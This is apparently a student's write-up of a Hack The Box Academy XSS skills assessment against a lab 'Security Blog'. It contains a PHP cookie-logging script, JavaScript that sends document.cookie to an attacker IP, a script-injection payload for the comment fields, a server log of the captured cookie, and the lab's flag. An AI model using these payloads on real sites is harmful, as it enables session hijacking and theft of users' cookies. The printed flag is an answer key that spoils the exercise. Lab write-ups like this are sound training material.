---
sticker: lucide//code
---
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new`Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the`/assessment` directory on the server using the browser:

 ![](https://academy.hackthebox.com/storage/modules/103/xss_skills_assessment_website.jpg)

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the`Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag


### Identifying the vulnerable parameter
---

Once we go into the website we can see the following:

![Pasted image 20250130180314.png](../../../IMAGES/Pasted%20image%2020250130180314.png)

If we go to the `Welcome to Security Blog` URL, we can see the following:

![Pasted image 20250130180344.png](../../../IMAGES/Pasted%20image%2020250130180344.png)

At first glance, the comments section seems vulnerable to XSS, let's test some simple payload to check the behavior of the web application, we can set up the same PHP server form the [Session Hijacking](XSS%20Attacks/Session%20Hijacking.md) section:

```php
<?php 
if (isset($_GET['c'])) { 
$list = explode(";", $_GET['c']); 
foreach ($list as $key => $value) { 
$cookie = urldecode($value); 
$file = fopen("cookies.txt", "a+"); 
fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); 
fclose($file); 
} 
} 
?>
```

```js
document.location='http://10.10.15.141/index.php?c='+document.cookie; 
new Image().src='http://10.10.15.141/index.php?c='+document.cookie;
```

We can send the payloads in each section to check which one is vulnerable:

```js
"><script src=http://10.10.15.141/script.js></script>
```

![Pasted image 20250130181138.png](../../../IMAGES/Pasted%20image%2020250130181138.png)

After a bit, we'll get the following in our server:

```
[Thu Jan 30 23:10:18 2025] PHP 8.3.15 Development Server (http://0.0.0.0:80) started
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37824 Accepted
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37824 [200]: GET /script.js
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37824 Closing
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37826 Accepted
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37826 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1738278667;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Thu Jan 30 23:11:08 2025] 10.129.147.238:37826 Closing
[Thu Jan 30 23:11:09 2025] 10.129.147.238:37828 Accepted
[Thu Jan 30 23:11:14 2025] 10.129.147.238:37828 Closed without sending a request; it was probably just an unused speculative preconnection
[Thu Jan 30 23:11:14 2025] 10.129.147.238:37828 Closing
```

We got the flag: `HTB{cr055_5173_5cr1p71n6_n1nj4}`

![Pasted image 20250130181248.png](../../../IMAGES/Pasted%20image%2020250130181248.png)

